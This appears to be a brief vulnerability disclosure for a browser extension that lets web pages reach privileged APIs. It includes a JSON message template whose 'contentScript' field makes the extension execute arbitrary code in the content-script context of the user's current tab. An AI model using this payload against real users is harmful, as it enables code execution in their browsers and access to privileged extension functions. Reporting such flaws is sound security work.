This extension gives web applications access to privileged APIs: eval, host, storage, downloads

How to reproduce:

Use webpage to send message like below structure and then serialize the message using JSON.stringify before sending it.  
The extension will execute arbitrary code in the context of the content scripts of the current tab the user navigates to.  

{  
type: "getResumeInfo",  
downloadObj: {  
resumeWhereabouts: 5  
},  
context: {  
contentScript: CODE,  
jsMethod: "console.log"  
}  
}  

